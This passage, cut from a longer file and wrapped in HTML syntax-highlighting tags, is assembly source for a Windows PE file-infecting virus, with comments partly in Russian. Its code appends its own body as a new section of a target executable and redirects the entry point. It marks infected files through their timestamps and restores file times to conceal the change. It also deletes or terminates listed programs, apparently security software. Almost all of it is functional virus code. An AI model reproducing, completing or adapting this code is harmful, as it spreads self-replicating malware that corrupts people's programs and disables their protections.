</span><span class="sc1">;вернуть управление</span><span class="sc0">
</span><span class="sc1">;push   0</span><span class="sc0">
</span><span class="sc1">;call   ExitProcess</span><span class="sc0">
</span><span class="sc5">goto_host</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">open_handle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sCloseHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">goto_host_1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">old_rva</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">                     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">new_rva</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host</span><span class="sc0">
</span><span class="sc5">main_body_jmp</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">main_body</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">
</span><span class="sc1">;pusha</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">__1</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;eax=file to infect</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'"'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">   </span><span class="sc5">__2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'"'</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">is_bad_prog</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">__good_prog</span><span class="sc0">
</span><span class="sc1">;edi=end of program name</span><span class="sc0">
</span><span class="sc1">;edx=beginning of the path</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">DeleteBadProg</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0c2h</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc2">10</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">__good_prog</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">fopenEx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">not_opened</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">maphandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">filehandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;узнать время файла</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">faccess_time</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">fwrite_time</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">fcreate_time</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">filehandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sGetFileTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">is_infected</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">dont_infect</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;ebx=PE header</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">dont_infect</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">pe_head</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">obj_align</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">file_align</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;num of objects</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                      </span><span class="sc1">;last object in table</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;NT header size</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                 </span><span class="sc1">;ebx= object table</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;ebx=last object in table</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">new_sec_head</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc1">;almost random name</span><span class="sc0">

</span><span class="sc1">;сосчитаем RVA</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.RVA</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.VirtualSize</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">obj_align</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">obj_align</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ecx.RVA</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;сосчитаем Virtual Size</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vir_size</span><span class="sc0">
                        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">obj_align</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">obj_align</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ecx.VirtualSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;сосчитаем Physical Size</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vir_size</span><span class="sc0">
                        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">file_align</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">file_align</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ecx.PhysSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;сосчитаем Physical Offset</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.PhysOffset</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.PhysSize</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ecx.PhysOffset</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">new_sec_head</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">pe_head</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.VirtualSize</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;Image Size</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Entry point RVA</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;add image base</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">new_rva</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.RVA</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;Entry point RVA</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">


                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ecx.PhysOffset</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">maphandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">vir_size</span><span class="sc0">
</span><span class="sc1">;                       mov     ecx,[ecx.PhysSize]</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">;exit:</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mark_infection</span><span class="sc0">

</span><span class="sc1">;установить время файла</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">faccess_time</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">fwrite_time</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">fcreate_time</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc5">filehandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sSetFileTime</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">new_sec_head</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.PhysSize</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">dont_infect</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">maphandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; unmap, trunc. &amp; close file</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filehandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fcloseEx</span><span class="sc0">
</span><span class="sc1">;popa</span><span class="sc0">
</span><span class="sc5">not_opened</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">old_addr</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">mark_infection</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">fcreate_time</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">ebx.FT_dwLowDateTime</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">11001011110b</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">is_infected</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">fcreate_time</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;infected</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">ebx.FT_dwLowDateTime</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">11001011110b</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">       </span><span class="sc5">__1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;not infected</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TerminateBadProg</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc4">[</span><span class="sc5">prentry.th32ProcessID</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;Open process with all access rights</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc5">PROCESS_ALL_ACCESS</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sOpenProcess</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">sTerminateProcess</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">is_bad_prog</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;edi = our prog</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">term1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">StrPos</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0">        </span><span class="sc5">__bad_prog_found</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
